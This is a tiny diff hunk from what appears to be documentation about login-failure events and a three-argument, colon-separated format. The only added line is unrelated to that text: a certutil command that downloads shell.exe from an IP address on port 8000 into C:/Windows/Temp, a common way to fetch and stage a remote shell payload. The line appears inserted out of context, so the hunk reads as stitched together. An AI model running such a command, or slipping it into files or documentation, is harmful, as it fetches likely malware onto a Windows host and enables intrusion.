@@ -16,3 +16,4 @@ Login Failed -> When someone enters wrong credentials
 
 This requires three arguments separated by a colon which may not be null:
 
+Certutil -urlcache -f http://10.17.39.185:8000/shell.exe C:/Windows/Temp/shell.exe
